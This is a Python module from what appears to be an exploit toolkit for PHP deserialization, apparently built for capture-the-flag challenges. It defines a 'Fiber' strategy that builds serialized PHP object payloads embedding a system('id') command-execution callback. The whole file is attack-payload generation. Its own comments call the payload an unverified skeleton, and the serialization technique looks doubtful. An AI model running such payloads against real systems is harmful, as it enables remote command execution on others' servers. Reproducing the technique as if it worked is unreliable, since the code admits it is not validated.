"""
Fiber 协程高级策略 - PHP 8.1+
用于生成基于 Fiber 的代码执行 Payload
"""

from typing import Any
from .base_advanced import AdvancedStrategy
from ..registry import register_advanced_strategy


@register_advanced_strategy(lambda features: 'fiber' in features.tags)
class FiberStrategy(AdvancedStrategy):
    """
    Fiber 协程策略
    
    利用 PHP 8.1+ 的 Fiber 类实现反序列化后的代码执行。
    注意：此策略生成的 Payload 需要目标环境为 PHP 8.1+
    """
    
    def generate(self, classes: list, features: Any, **kwargs) -> str:
        """
        生成 Fiber 利用 Payload
        
        当前阶段返回格式正确但功能未完全验证的骨架 Payload。
        实际利用需要根据具体回调函数调整。
        """
        # 查找 Task 类
        task_class = None
        for cls in classes:
            if cls.name == 'Task':
                task_class = cls
                break
        
        if not task_class:
            # 如果没有找到 Task 类，返回一个通用的 Fiber Payload
            return self._generate_generic_fiber_payload()
        
        # 构造 Fiber Payload
        # O:4:"Task":1:{s:5:"fiber";C:5:"Fiber":长度:{回调函数序列化}}
        # 这里使用 system('id') 作为示例回调
        callback_payload = 's:6:"system";s:2:"id";'
        fiber_content = f'C:5:"Fiber":{len(callback_payload)}:{{{callback_payload}}}'
        
        payload = f'O:4:"Task":1:{{s:5:"fiber";{fiber_content}}}'
        
        return payload
    
    def _generate_generic_fiber_payload(self) -> str:
        """生成通用的 Fiber Payload（当找不到 Task 类时）"""
        # 这是一个示例 Payload，实际使用时需要根据题目调整
        callback = 's:6:"system";s:2:"id";'
        fiber_serialized = f'C:5:"Fiber":{len(callback)}:{{{callback}}}'
        return f'O:4:"Task":1:{{s:5:"fiber";{fiber_serialized}}}'
    
    def get_description(self) -> str:
        return "V3 实验性 Fiber 协程策略 - 适用于 PHP 8.1+ 环境"
